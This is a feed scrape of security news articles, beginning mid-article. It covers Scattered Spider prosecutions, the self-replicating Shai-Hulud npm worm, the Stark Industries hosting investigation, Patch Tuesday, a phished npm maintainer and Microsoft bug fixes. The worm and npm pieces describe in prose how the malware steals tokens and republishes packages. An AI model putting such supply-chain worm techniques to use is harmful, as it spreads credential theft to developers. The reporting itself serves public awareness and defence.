legal immunity.”\nNixon said U.K. authorities face the same challenge when they briefly detain and search the homes of underage Com suspects: Namely, the teen suspects simply go right back to their respective cliques in the Com and start robbing and hurting people again the minute they’re released.\nIndeed, the U.K. court heard from prosecutors last week that both Scattered Spider suspects were detained and/or searched by local law enforcement on multiple occasions, only to return to the Com less than 24 hours after being released each time.\n“What we see is these young Com members become vectors for perpetrators to commit enormously harmful acts and even child abuse,” Nixon said. “The members of this special category of people who enjoy legal immunity are meeting up with foreign nationals and conducting these sometimes heinous acts at their behest.”\nNixon said many of these individuals have few friends in real life because they spend virtually all of their waking hours on Com channels, and so their entire sense of identity, community and self-worth gets wrapped up in their involvement with these online gangs. She said if the law was such that prosecutors could treat these people commensurate with the amount of harm they cause society, that would probably clear up a lot of this problem.\n“If law enforcement was allowed to keep them in jail, they would quit reoffending,” she said.\nThe Times of London reports that Flowers is facing three charges under the Computer Misuse Act: two of conspiracy to commit an unauthorized act in relation to a computer causing/creating risk of serious damage to human welfare/national security and one of attempting to commit the same act. Maximum sentences for these offenses can range from 14 years to life in prison, depending on the impact of the crime.\nJubair is reportedly facing two charges in the U.K.: One of conspiracy to commit an unauthorized act in relation to a computer causing/creating risk of serious damage to human welfare/national security and one of failing to comply with a section 49 notice to disclose the key to protected information.\nIn the United States, Jubair is charged with computer fraud conspiracy, two counts of computer fraud, wire fraud conspiracy, two counts of wire fraud, and money laundering conspiracy. If extradited to the U.S., tried and convicted on all charges, he faces a maximum penalty of 95 years in prison.\nIn July 2025, the United Kingdom barred victims of hacking from paying ransoms to cybercriminal groups unless approved by officials. U.K. organizations that are considered part of critical infrastructure reportedly will face a complete ban, as will the entire public sector. U.K. victims of a hack are now required to notify officials to better inform policymakers on the scale of Britain’s ransomware problem.\nFor further reading (bless you), check out Bloomberg’s poignant story last week based on a year’s worth of jailhouse interviews with convicted Scattered Spider member Noah Urban.", "timestamp": "2025-10-21T13:35:11.452360"}
{"source": "blog", "feed": "https://krebsonsecurity.com/feed/", "title": "Self-Replicating Worm Hits 180+ Software Packages", "url": "https://krebsonsecurity.com/2025/09/self-replicating-worm-hits-180-software-packages/", "published": "Tue, 16 Sep 2025 14:08:02 +0000", "content": "At least 187 code packages made available through the JavaScript repository NPM have been infected with a self-replicating worm that steals credentials from developers and publishes those secrets on GitHub, experts warn. The malware, which briefly infected multiple code packages from the security vendor CrowdStrike, steals and publishes even more credentials every time an infected package is installed.\nThe novel malware strain is being dubbed Shai-Hulud — after the name for the giant sandworms in Frank Herbert’s Dune novel series — because it publishes any stolen credentials in a new public GitHub repository that includes the name “Shai-Hulud.”\n“When a developer installs a compromised package, the malware will look for a npm token in the environment,” said Charlie Eriksen, a researcher for the Belgian security firm Aikido. “If it finds it, it will modify the 20 most popular packages that the npm token has access to, copying itself into the package, and publishing a new version.”\nAt the center of this developing maelstrom are code libraries available on NPM (short for “Node Package Manager”), which acts as a central hub for JavaScript development and provides the latest updates to widely-used JavaScript components.\nThe Shai-Hulud worm emerged just days after unknown attackers launched a broad phishing campaign that spoofed NPM and asked developers to “update” their multi-factor authentication login options. That attack led to malware being inserted into at least two-dozen NPM code packages, but the outbreak was quickly contained and was narrowly focused on siphoning cryptocurrency payments.\nIn late August, another compromise of an NPM developer resulted in malware being added to “nx,” an open-source code development toolkit with as many as six million weekly downloads. In the nx compromise, the attackers introduced code that scoured the user’s device for authentication tokens from programmer destinations like GitHub and NPM, as well as SSH and API keys. But instead of sending those stolen credentials to a central server controlled by the attackers, the malicious nx code created a new public repository in the victim’s GitHub account, and published the stolen data there for all the world to see and download.\nLast month’s attack on nx did not self-propagate like a worm, but this Shai-Hulud malware does and bundles reconnaissance tools to assist in its spread. Namely, it uses the open-source tool TruffleHog to search for exposed credentials and access tokens on the developer’s machine. It then attempts to create new GitHub actions and publish any stolen secrets.\n“Once the first person got compromised, there was no stopping it,” Aikido’s Eriksen told KrebsOnSecurity. He said the first NPM package compromised by this worm appears to have been altered on Sept. 14, around 17:58 UTC.\nThe security-focused code development platform socket.dev reports the Shai-Halud attack briefly compromised at least 25 NPM code packages managed by CrowdStrike. Socket.dev said the affected packages were quickly removed by the NPM registry.\nIn a written statement shared with KrebsOnSecurity, CrowdStrike said that after detecting several malicious packages in the public NPM registry, the company swiftly removed them and rotated its keys in public registries.\n“These packages are not used in the Falcon sensor, the platform is not impacted and customers remain protected,” the statement reads, referring to the company’s widely-used endpoint threat detection service. “We are working with NPM and conducting a thorough investigation.”\nA writeup on the attack from StepSecurity found that for cloud-specific operations, the malware enumerates AWS, Azure and Google Cloud Platform secrets. It also found the entire attack design assumes the victim is working in a Linux or macOS environment, and that it deliberately skips Windows systems.\nStepSecurity said Shai-Hulud spreads by using stolen NPM authentication tokens, adding its code to the top 20 packages in the victim’s account.\n“This creates a cascading effect where an infected package leads to compromised maintainer credentials, which in turn infects all other packages maintained by that user,” StepSecurity’s Ashish Kurmi wrote.\nEriksen said Shai-Hulud is still propagating, although its spread seems to have waned in recent hours.\n“I still see package versions popping up once in a while, but no new packages have been compromised in the last ~6 hours,” Eriksen said. “But that could change now as the east coast starts working. I would think of this attack as a ‘living’ thing almost, like a virus. Because it can lay dormant for a while, and if just one person is suddenly infected by accident, they could restart the spread. Especially if there’s a super-spreader attack.”\nFor now, it appears that the web address the attackers were using to exfiltrate collected data was disabled due to rate limits, Eriksen said.\nNicholas Weaver is a researcher with the International Computer Science Institute, a nonprofit in Berkeley, Calif. Weaver called the Shai-Hulud worm “a supply chain attack that conducts a supply chain attack.” Weaver said NPM (and all other similar package repositories) need to immediately switch to a publication model that requires explicit human consent for every publication request using a phish-proof 2FA method.\n“Anything less means attacks like this are going to continue and become far more common, but switching to a 2FA method would effectively throttle these attacks before they can spread,” Weaver said. “Allowing purely automated processes to update the published packages is now a proven recipe for disaster.”", "timestamp": "2025-10-21T13:35:12.435533"}
{"source": "blog", "feed": "https://krebsonsecurity.com/feed/", "title": "Bulletproof Host Stark Industries Evades EU Sanctions", "url": "https://krebsonsecurity.com/2025/09/bulletproof-host-stark-industries-evades-eu-sanctions/", "published": "Thu, 11 Sep 2025 17:40:22 +0000", "content": "In May 2025, the European Union levied financial sanctions on the owners of Stark Industries Solutions Ltd., a bulletproof hosting provider that materialized two weeks before Russia invaded Ukraine and quickly became a top source of Kremlin-linked cyberattacks and disinformation campaigns. But new findings show those sanctions have done little to stop Stark from simply rebranding and transferring their assets to other corporate entities controlled by its original hosting providers.\nMaterializing just two weeks before Russia invaded Ukraine in 2022, Stark Industries Solutions became a frequent source of massive DDoS attacks, Russian-language proxy and VPN services, malware tied to Russia-backed hacking groups, and fake news. ISPs like Stark are called “bulletproof” providers when they cultivate a reputation for ignoring any abuse complaints or police inquiries about activity on their networks.\nIn May 2025, the European Union sanctioned one of Stark’s two main conduits to the larger Internet — Moldova-based PQ Hosting — as well as the company’s Moldovan owners Yuri and Ivan Neculiti. The EU Commission said the Neculiti brothers and PQ Hosting were linked to Russia’s hybrid warfare efforts.\nBut a new report from Recorded Future finds that just prior to the sanctions being announced, Stark rebranded to the[.]hosting, under control of the Dutch entity WorkTitans BV (AS209847) on June 24, 2025. The Neculiti brothers reportedly got a heads up roughly 12 days before the sanctions were announced, when Moldovan and EU media reported on the forthcoming inclusion of the Neculiti brothers in the sanctions package.\nIn response, the Neculiti brothers moved much of Stark’s considerable address space and other resources over to a new company in Moldova called PQ Hosting Plus S.R.L., an entity reportedly connected to the Neculiti brothers thanks to the re-use of a phone number from the original PQ Hosting.\n“Although the majority of associated infrastructure remains attributable to Stark Industries, these changes likely reflect an attempt to obfuscate ownership and sustain hosting services under new legal and network entities,” Recorded Future observed.\nNeither the Recorded Future report nor the May 2025 sanctions from the EU mentioned a second critical pillar of Stark’s network that KrebsOnSecurity identified in a May 2024 profile on the notorious bulletproof hoster: The Netherlands-based hosting provider MIRhosting.\nMIRhosting is operated by 38-year old Andrey Nesterenko, whose personal website says he is an accomplished concert pianist who began performing publicly at a young age. DomainTools says mirhosting[.]com is registered to Mr. Nesterenko and to Innovation IT Solutions Corp, which lists addresses in London and in Nesterenko’s stated hometown of Nizhny Novgorod, Russia.\nAccording to the book Inside Cyber Warfare by Jeffrey Carr, Innovation IT Solutions Corp. was responsible for hosting StopGeorgia[.]ru, a hacktivist website for organizing cyberattacks against Georgia that appeared at the same time Russian forces invaded the former Soviet nation in 2008. That conflict was thought to be the first war ever fought in which a notable cyberattack and an actual military engagement happened simultaneously.\nMr. Nesterenko did not respond to requests for comment. In May 2024, Mr. Nesterenko said he couldn’t verify whether StopGeorgia was ever a customer because they didn’t keep records going back that far. But he maintained that Stark Industries Solutions was merely one client of many, and claimed MIRhosting had not received any actionable complaints about abuse on Stark.\nHowever, it appears that MIRhosting is once again the new home of Stark Industries, and that MIRhosting employees are managing both the[.]hosting and WorkTitans — the primary beneficiaries of Stark’s assets.\nA copy of the incorporation documents for WorkTitans BV obtained from the Dutch Chamber of Commerce shows WorkTitans also does business under the names Misfits Media and and WT Hosting (considering Stark’s historical connection to Russian disinformation websites, “Misfits Media” is a bit on the nose).\nThe incorporation document says the company was formed in 2019 by a y.zinad@worktitans.nl. That email address corresponds to a LinkedIn account for a Youssef Zinad, who says their personal websites are worktitans[.]nl and custom-solution[.]nl. The profile also links to a website (etripleasims dot nl) that LinkedIn currently blocks as malicious. All of these websites are or were hosted at MIRhosting.\nAlthough Mr. Zinad’s LinkedIn profile does not mention any employment at MIRhosting, virtually all of his LinkedIn posts over the past year have been reposts of advertisements for MIRhosting’s services.\nA Google search for Youssef Zinad reveals multiple startup-tracking websites that list him as the founder of the[.]hosting, which censys.io finds is hosted by PQ Hosting Plus S.R.L.\nThe Dutch Chamber of Commerce document says WorkTitans’ sole shareholder is a company in Almere, Netherlands called Fezzy B.V. Who runs Fezzy? The phone number listed in a Google search for Fezzy B.V. — 31651079755 — also was used to register a Facebook profile for a Youssef Zinad from the same town, according to the breach tracking service Constella Intelligence.\nIn a series of email exchanges leading up to KrebsOnSecurity’s May 2024 deep dive on Stark, Mr. Nesterenko included Mr. Zinad in the message thread (youssef@mirhosting.com), referring to him as part of the company’s legal team. The Dutch website stagemarkt[.]nl lists Youssef Zinad as an official contact for MIRhosting’s offices in Almere. Mr. Zinad did not respond to requests for comment.\nGiven the above, it is difficult to argue with the Recorded Future report on Stark’s rebranding, which concluded that “the EU’s sanctioning of Stark Industries was largely ineffective, as affiliated infrastructure remained operational and services were rapidly re-established under new branding, with no significant or lasting disruption.”", "timestamp": "2025-10-21T13:35:13.154143"}
{"source": "blog", "feed": "https://krebsonsecurity.com/feed/", "title": "Microsoft Patch Tuesday, September 2025 Edition", "url": "https://krebsonsecurity.com/2025/09/microsoft-patch-tuesday-september-2025-edition/", "published": "Tue, 09 Sep 2025 21:21:14 +0000", "content": "Microsoft Corp. today issued security updates to fix more than 80 vulnerabilities in its Windows operating systems and software. There are no known “zero-day” or actively exploited vulnerabilities in this month’s bundle from Redmond, which nevertheless includes patches for 13 flaws that earned Microsoft’s most-dire “critical” label. Meanwhile, both Apple and Google recently released updates to fix zero-day bugs in their devices.\nMicrosoft assigns security flaws a “critical” rating when malware or miscreants can exploit them to gain remote access to a Windows system with little or no help from users. Among the more concerning critical bugs quashed this month is CVE-2025-54918. The problem here resides with Windows NTLM, or NT LAN Manager, a suite of code for managing authentication in a Windows network environment.\nRedmond rates this flaw as “Exploitation More Likely,” and although it is listed as a privilege escalation vulnerability, Kev Breen at Immersive says this one is actually exploitable over the network or the Internet.\n“From Microsoft’s limited description, it appears that if an attacker is able to send specially crafted packets over the network to the target device, they would have the ability to gain SYSTEM-level privileges on the target machine,” Breen said. “The patch notes for this vulnerability state that ‘Improper authentication in Windows NTLM allows an authorized attacker to elevate privileges over a network,’ suggesting an attacker may already need to have access to the NTLM hash or the user’s credentials.”\nBreen said another patch — CVE-2025-55234, a 8.8 CVSS-scored flaw affecting the Windows SMB client for sharing files across a network — also is listed as privilege escalation bug but is likewise remotely exploitable. This vulnerability was publicly disclosed prior to this month.\n“Microsoft says that an attacker with network access would be able to perform a replay attack against a target host, which could result in the attacker gaining additional privileges, which could lead to code execution,” Breen noted.\nCVE-2025-54916 is an “important” vulnerability in Windows NTFS — the default filesystem for all modern versions of Windows — that can lead to remote code execution. Microsoft likewise thinks we are more than likely to see exploitation of this bug soon: The last time Microsoft patched an NTFS bug was in March 2025 and it was already being exploited in the wild as a zero-day.\n“While the title of the CVE says ‘Remote Code Execution,’ this exploit is not remotely exploitable over the network, but instead needs an attacker to either have the ability to run code on the host or to convince a user to run a file that would trigger the exploit,” Breen said. “This is commonly seen in social engineering attacks, where they send the user a file to open as an attachment or a link to a file to download and run.”\nCritical and remote code execution bugs tend to steal all the limelight, but Tenable Senior Staff Research Engineer Satnam Narang notes that nearly half of all vulnerabilities fixed by Microsoft this month are privilege escalation flaws that require an attacker to have gained access to a target system first before attempting to elevate privileges.\n“For the third time this year, Microsoft patched more elevation of privilege vulnerabilities than remote code execution flaws,” Narang observed.\nOn Sept. 3, Google fixed two flaws that were detected as exploited in zero-day attacks, including CVE-2025-38352, an elevation of privilege in the Android kernel, and CVE-2025-48543, also an elevation of privilege problem in the Android Runtime component.\nAlso, Apple recently patched its seventh zero-day (CVE-2025-43300) of this year. It was part of an exploit chain used along with a vulnerability in the WhatsApp (CVE-2025-55177) instant messenger to hack Apple devices. Amnesty International reports that the two zero-days have been used in “an advanced spyware campaign” over the past 90 days. The issue is fixed in iOS 18.6.2, iPadOS 18.6.2, iPadOS 17.7.10, macOS Sequoia 15.6.1, macOS Sonoma 14.7.8, and macOS Ventura 13.7.8.\nThe SANS Internet Storm Center has a clickable breakdown of each individual fix from Microsoft, indexed by severity and CVSS score. Enterprise Windows admins involved in testing patches before rolling them out should keep an eye on askwoody.com, which often has the skinny on wonky updates.\nAskWoody also reminds us that we’re now just two months out from Microsoft discontinuing free security updates for Windows 10 computers. For those interested in safely extending the lifespan and usefulness of these older machines, check out last month’s Patch Tuesday coverage for a few pointers.\nAs ever, please don’t neglect to back up your data (if not your entire system) at regular intervals, and feel free to sound off in the comments if you experience problems installing any of these fixes.", "timestamp": "2025-10-21T13:35:13.785910"}
{"source": "blog", "feed": "https://krebsonsecurity.com/feed/", "title": "18 Popular Code Packages Hacked, Rigged to Steal Crypto", "url": "https://krebsonsecurity.com/2025/09/18-popular-code-packages-hacked-rigged-to-steal-crypto/", "published": "Mon, 08 Sep 2025 22:53:41 +0000", "content": "At least 18 popular JavaScript code packages that are collectively downloaded more than two billion times each week were briefly compromised with malicious software today, after a developer involved in maintaining the projects was phished. The attack appears to have been quickly contained and was narrowly focused on stealing cryptocurrency. But experts warn that a similar attack with a slightly more nefarious payload could lead to a disruptive malware outbreak that is far more difficult to detect and restrain.\nAikido is a security firm in Belgium that monitors new code updates to major open-source code repositories, scanning any code updates for suspicious and malicious code. In a blog post published today, Aikido said its systems found malicious code had been added to at least 18 widely-used code libraries available on NPM (short for) “Node Package Manager,” which acts as a central hub for JavaScript development and the latest updates to widely-used JavaScript components.\nJavaScript is a powerful web-based scripting language used by countless websites to build a more interactive experience with users, such as entering data into a form. But there’s no need for each website developer to build a program from scratch for entering data into a form when they can just reuse already existing packages of code at NPM that are specifically designed for that purpose.\nUnfortunately, if cybercriminals manage to phish NPM credentials from developers, they can introduce malicious code that allows attackers to fundamentally control what people see in their web browser when they visit a website that uses one of the affected code libraries.\nAccording to Aikido, the attackers injected a piece of code that silently intercepts cryptocurrency activity in the browser, “manipulates wallet interactions, and rewrites payment destinations so that funds and approvals are redirected to attacker-controlled accounts without any obvious signs to the user.”\n“This malware is essentially a browser-based interceptor that hijacks both network traffic and application APIs,” Aikido researcher Charlie Eriksen wrote. “What makes it dangerous is that it operates at multiple layers: Altering content shown on websites, tampering with API calls, and manipulating what users’ apps believe they are signing. Even if the interface looks correct, the underlying transaction can be redirected in the background.”\nAikido said it used the social network Bsky to notify the affected developer, Josh Junon, who quickly replied that he was aware of having just been phished. The phishing email that Junon fell for was part of a larger campaign that spoofed NPM and told recipients they were required to update their two-factor authentication (2FA) credentials. The phishing site mimicked NPM’s login page, and intercepted Junon’s credentials and 2FA token. Once logged in, the phishers then changed the email address on file for Junon’s NPM account, temporarily locking him out.\nJunon also issued a mea culpa on HackerNews, telling the community’s coder-heavy readership, “Hi, yep I got pwned.”\n“It looks and feels a bit like a targeted attack,” Junon wrote. “Sorry everyone, very embarrassing.”\nPhilippe Caturegli, “chief hacking officer” at the security consultancy Seralys, observed that the attackers appear to have registered their spoofed website — npmjs[.]help — just two days before sending the phishing email. The spoofed website used services from dnsexit[.]com, a “dynamic DNS” company that also offers “100% free” domain names that can instantly be pointed at any IP address controlled by the user.\nCaturegli said it’s remarkable that the attackers in this case were not more ambitious or malicious with their code modifications.\n“The crazy part is they compromised billions of websites and apps just to target a couple of cryptocurrency things,” he said. “This was a supply chain attack, and it could easily have been something much worse than crypto harvesting.”\nAikido’s Eriksen agreed, saying countless websites dodged a bullet because this incident was handled in a matter of hours. As an example of how these supply-chain attacks can escalate quickly, Eriksen pointed to another compromise of an NPM developer in late August that added malware to “nx,” an open-source code development toolkit with as many as six million weekly downloads.\nIn the nx compromise, the attackers introduced code that scoured the user’s device for authentication tokens from programmer destinations like GitHub and NPM, as well as SSH and API keys. But instead of sending those stolen credentials to a central server controlled by the attackers, the malicious code created a new public repository in the victim’s GitHub account, and published the stolen data there for all the world to see and download.\nEriksen said coding platforms like GitHub and NPM should be doing more to ensure that any new code commits for broadly-used packages require a higher level of attestation that confirms the code in question was in fact submitted by the person who owns the account, and not just by that person’s account.\n“More popular packages should require attestation that it came through trusted provenance and not just randomly from some location on the Internet,” Eriksen said. “Where does the package get uploaded from, by GitHub in response to a new pull request into the main branch, or somewhere else? In this case, they didn’t compromise the target’s GitHub account. They didn’t touch that. They just uploaded a modified version that didn’t come where it’s expected to come from.”\nEriksen said code repository compromises can be devastating for developers, many of whom end up abandoning their projects entirely after such an incident.\n“It’s unfortunate because one thing we’ve seen is people have their projects get compromised and they say, ‘You know what, I don’t have the energy for this and I’m just going to deprecate the whole package,'” Eriksen said.\nKevin Beaumont, a frequently quoted security expert who writes about security incidents at the blog doublepulsar.com, has been following this story closely today in frequent updates to his account on Mastodon. Beaumont said the incident is a reminder that much of the planet still depends on code that is ultimately maintained by an exceedingly small number of people who are mostly overburdened and under-resourced.\n“For about the past 15 years every business has been developing apps by pulling in 178 interconnected libraries written by 24 people in a shed in Skegness,” Beaumont wrote on Mastodon. “For about the past 2 years orgs have been buying AI vibe coding tools, where some exec screams ‘make online shop’ into a computer and 389 libraries are added and an app is farted out. The output = if you want to own the world’s companies, just phish one guy in Skegness.”\nAikido recently launched a product that aims to help development teams ensure that every code library used is checked for malware before it can be used or installed. Nicholas Weaver, a researcher with the International Computer Science Institute, a nonprofit in Berkeley, Calif., said Aikido’s new offering exists because many organizations are still one successful phishing attack away from a supply-chain nightmare.\nWeaver said these types of supply-chain compromises will continue as long as people responsible for maintaining widely-used code continue to rely on phishable forms of 2FA.\n“NPM should only support phish-proof authentication,” Weaver said, referring to physical security keys that are phish-proof — meaning that even if phishers manage to steal your username and password, they still can’t log in to your account without also possessing that physical key.\n“All critical infrastructure needs to use phish-proof 2FA, and given the dependencies in modern software, archives such as NPM are absolutely critical infrastructure,” Weaver said. “That NPM does not require that all contributor accounts use security keys or similar 2FA methods should be considered negligence.”", "timestamp": "2025-10-21T13:35:14.775990"}
{"source": "blog", "feed": "https://krebsonsecurity.com/feed/", "title": "GOP Cries Censorship Over Spam Filters That Work", "url": "https://krebsonsecurity.com/2025/09/gop-cries-censorship-over-spam-filters-that-work/", "published": "Sat, 06 Sep 2025 03:23:35 +0000", "content": "The chairman of the Federal Trade Commission (FTC) last week sent a letter to Google’s CEO demanding to know why Gmail was blocking messages from Republican senders while allegedly failing to block similar missives supporting Democrats. The letter followed media reports accusing Gmail of disproportionately flagging messages from the GOP fundraising platform WinRed and sending them to the spam folder. But according to experts who track daily spam volumes worldwide, WinRed’s messages are getting blocked more because its methods of blasting email are increasingly way more spammy than that of ActBlue, the fundraising platform for Democrats.\nOn Aug. 13, The New York Post ran an “exclusive” story titled, “Google caught flagging GOP fundraiser emails as ‘suspicious’ — sending them directly to spam.” The story cited a memo from Targeted Victory – whose clients include the National Republican Senatorial Committee (NRSC), Rep. Steve Scalise and Sen. Marsha Blackburn – which said it observed that the “serious and troubling” trend was still going on as recently as June and July of this year.\n“If Gmail is allowed to quietly suppress WinRed links while giving ActBlue a free pass, it will continue to tilt the playing field in ways that voters never see, but campaigns will feel every single day,” the memo reportedly said.\nIn an August 28 letter to Google CEO Sundar Pichai, FTC Chairman Andrew Ferguson cited the New York Post story and warned that Gmail’s parent Alphabet may be engaging in unfair or deceptive practices.\n“Alphabet’s alleged partisan treatment of comparable messages or messengers in Gmail to achieve political objectives may violate both of these prohibitions under the FTC Act,” Ferguson wrote. “And the partisan treatment may cause harm to consumers.”\nHowever, the situation looks very different when you ask spam experts what’s going on with WinRed’s recent messaging campaigns. Atro Tossavainen and Pekka Jalonen are co-founders at Koli-Lõks OÜ, an email intelligence company in Estonia. Koli-Lõks taps into real-time intelligence about daily spam volumes by monitoring large numbers of “spamtraps” — email addresses that are intentionally set up to catch unsolicited emails.\nSpamtraps are generally not used for communication or account creation, but instead are created to identify senders exhibiting spammy behavior, such as scraping the Internet for email addresses or buying unmanaged distribution lists. As an email sender, blasting these spamtraps over and over with unsolicited email is the fastest way to ruin your domain’s reputation online. Such activity also virtually ensures that more of your messages are going to start getting listed on spam blocklists that are broadly shared within the global anti-abuse community.\nTossavainen told KrebsOnSecurity that WinRed’s emails hit its spamtraps in the .com, .net, and .org space far more frequently than do fundraising emails sent by ActBlue. Koli-Lõks published a graph of the stark disparity in spamtrap activity for WinRed versus ActBlue, showing a nearly fourfold increase in spamtrap hits from WinRed emails in the final week of July 2025.\n“Many of our spamtraps are in repurposed legacy-TLD domains (.com, .org, .net) and therefore could be understood to have been involved with a U.S. entity in their pre-zombie life,” Tossavainen explained in the LinkedIn post.\nRaymond Dijkxhoorn is the CEO and a founding member of SURBL, a widely-used blocklist that flags domains and IP addresses known to be used in unsolicited messages, phishing and malware distribution. Dijkxhoorn said their spamtrap data mirrors that of Koli-Lõks, and shows that WinRed has consistently been far more aggressive in sending email than ActBlue.\nDijkxhoorn said the fact that WinRed’s emails so often end up dinging the organization’s sender reputation is not a content issue but rather a technical one.\n“On our end we don’t really care if the content is political or trying to sell viagra or penis enlargements,” Dijkxhoorn said. “It’s the mechanics, they should not end up in spamtraps. And that’s the reason the domain reputation is tempered. Not ‘because domain reputation firms have a political agenda.’ We really don’t care about the political situation anywhere. The same as we don’t mind people buying penis enlargements. But when either of those land in spamtraps it will impact sending experience.”\nThe FTC letter to Google’s CEO also referenced a debunked 2022 study (PDF) by political consultants who found Google caught more Republican emails in spam filters. Techdirt editor Mike Masnick notes that while the 2022 study also found that other email providers caught more Democratic emails as spam, “Republicans laser-focused on Gmail because it fit their victimization narrative better.”\nMasnick said GOP lawmakers then filed both lawsuits and complaints with the Federal Election Commission (both of which failed easily), claiming this was somehow an “in-kind contribution” to Democrats.\n“This is political posturing designed to keep the White House happy by appearing to ‘do something’ about conservative claims of ‘censorship,'” Masnick wrote of the FTC letter. “The FTC has never policed ‘political bias’ in private companies’ editorial decisions, and for good reason—the First Amendment prohibits exactly this kind of government interference.”\nWinRed did not respond to a request for comment.\nThe WinRed website says it is an online fundraising platform supported by a united front of the Trump campaign, the Republican National Committee (RNC), the NRSC, and the National Republican Congressional Committee (NRCC).\nWinRed has recently come under fire for aggressive fundraising via text message as well. In June, 404 Media reported on a lawsuit filed by a family in Utah against the RNC for allegedly bombarding their mobile phones with text messages seeking donations after they’d tried to unsubscribe from the missives dozens of times.\nOne of the family members said they received 27 such messages from 25 numbers, even after sending 20 stop requests. The plaintiffs in that case allege the texts from WinRed and the RNC “knowingly disregard stop requests and purposefully use different phone numbers to make it impossible to block new messages.”\nDijkxhoorn said WinRed did inquire recently about why some of its assets had been marked as a risk by SURBL, but he said they appeared to have zero interest in investigating the likely causes he offered in reply.\n“They only replied with, ‘You are interfering with U.S. elections,'” Dijkxhoorn said, noting that many of SURBL’s spamtrap domains are only publicly listed in the registration records for random domain names.\n“They’re at best harvested by themselves but more likely [they] just went and bought lists,” he said. “It’s not like ‘Oh Google is filtering this and not the other,’ the reason isn’t the provider. The reason is the fundraising spammers and the lists they send to.”", "timestamp": "2025-10-21T13:35:15.506981"}
{"source": "blog", "feed": "https://www.bleepingcomputer.com/feed/", "title": "Microsoft fixes bug preventing users from opening classic Outlook", "url": "https://www.bleepingcomputer.com/news/microsoft/microsoft-fixes-bug-preventing-users-from-opening-classic-outlook/", "published": "Tue, 21 Oct 2025 08:59:48 -0400", "content": "Microsoft has fixed a major bug preventing Microsoft 365 users from launching the classic Outlook email client on Windows systems.\nAs explained when it acknowledged the issue in September, affected customers are seeing errors saying that the app cannot be started, that the Outlook window cannot be opened, and that an attempt to log into the Exchange account has failed.\n\"This error message can occur for different reasons. Not every instance of this error is the same issue but recent support cases around this have been for user mailboxes,\" Microsoft said.\nWhile it initially advised impacted users to open a support case with the Exchange Online support team to request a service change to mitigate it, Microsoft updated the support document on Monday to tag this known issue as fixed and added that the Outlook team is still monitoring to confirm it was fully mitigated.\n\"The service team implemented changes to address the issue. We are monitoring to confirm the issue is addressed,\" the company said.\nMicrosoft also advised users who still can't open classic Outlook to switch to Outlook Web Access (OWA) or the new Outlook for Windows as a temporary workaround to access their mailboxes.\nIn a separate support document regarding \"Cannot start Microsoft Outlook. Cannot open the Outlook Window\" errors, Microsoft prompts users to follow these troubleshooting steps to resolve Outlook startup issues:\n- Start Outlook in safe mode and disable add-ins\n- Create a new Outlook profile\n- Repair your Outlook data files\n- Run the /resetnavpane command\nEarlier this year, Microsoft also addressed classic Outlook bugs that broke email and calendar drag-and-drop functionality after installing Windows 24H2 updates and caused CPU spikes when typing messages.\nBefore this, Redmond fixed a bug that triggered classic Outlook crashes when starting new messages or opening emails and shared a temporary workaround for a known issue that caused Outlook errors when opening encrypted emails.\nPicus Blue Report 2025 is Here: 2X increase in password cracking\n46% of environments had passwords cracked, nearly doubling from 25% last year.\nGet the Picus Blue Report 2025 now for a comprehensive look at more findings on prevention, detection, and data exfiltration trends.", "timestamp": "2025-10-21T13:35:34.504820"}
{"source": "blog", "feed": "https://www.bleepingcomputer.com/feed/", "title": "Windows 11 KB5070773 emergency update fixes Windows Recovery issues", "url": "https://www.bleepingcomputer.com/news/microsoft/microsoft-fixes-usb-issue-that-made-windows-recovery-unusable/", "published": "Tue, 21 Oct 2025 05:01:44 -0400", "content": "Microsoft has released an emergency update to fix the Windows Recovery Environment (WinRE), which became unusable on systems with USB mice and keyboards after installing the October 2025 security updates.\nAs the company explained on Friday, when it acknowledged it, this issue blocks users from selecting or navigating recovery options within WinRE, even though the mouse and keyboard continue to work after logging into Windows.\nOn Tuesday, Microsoft announced that it had resolved the bug behind these WinRE issues and started rolling out an out-of-band cumulative update (KB5070773), one week after the KB5066835 buggy update started disabling USB-wired input devices in WinRE on client (Windows 11 24H2 and Windows 11 25H2) and server (Windows Server 2025) platforms.\n\"This issue was resolved by the Windows out-of-band update, released October 20, 2025 (KB5070773), and updates released after that date,\" Microsoft said in a Windows release health update.\n\"We recommend you install the latest update for your device as it contains important improvements and issue resolutions, including this one.\"\nAffected customers whose devices cannot boot to install this update are advised to use one of the following methods as a workaround:\n- If your PC has a touchscreen, you can use its touch keyboard to navigate WinRE.\n- If your PC has a PS/2 port, you can use a PS/2 keyboard or mouse to navigate within WinRE.\n- If you previously created a USB recovery drive, you can boot your computer from it. This will take you directly to WinRE with restored USB functionality.\nMicrosoft also advised OEMs and enterprises to use the Preboot Execution Environment (PXE) in Configuration Manager to install the KB5070773 out-of-band update to recover affected devices.\nAs an alternative, IT administrators can also deploy push-button reset features using the Windows Assessment and Deployment Kit (Windows ADK) and Windows Preinstallation Environment (WinPE) add-on to revive impacted endpoints on their network.\nWinRE is a minimal Windows-based environment that allows users to repair or restore the operating system after the device fails to start following a blue screen of death (BSOD) errors and various other critical issues.\nOn Friday, it also shared guidance on resolving smart card authentication issues affecting all Windows 10, Windows 11, and Windows Server devices, and it fixed Active Directory issues after installing security updates released since September on Windows Server 2025 systems.\nThe same day, Redmond addressed another known issue that broke HTTP/2 localhost (127.0.0.1) connections and removed two compatibility holds blocking Windows 11 upgrades via Windows Update.\nIn August 2024, Microsoft was also forced to retire Windows security updates that triggered 0x80070643 errors during WinRE updates on Windows 10, Windows 11, and Windows Server systems.\nPicus Blue Report 2025 is Here: 2X increase in password cracking\n46% of environments had passwords cracked, nearly doubling from 25% last year.\nGet the Picus Blue Report 2025 now for a comprehensive look at more findings on prevention, detection, and data exfiltration trends.", "timestamp": "2025-10-21T13:35:35.240103"}
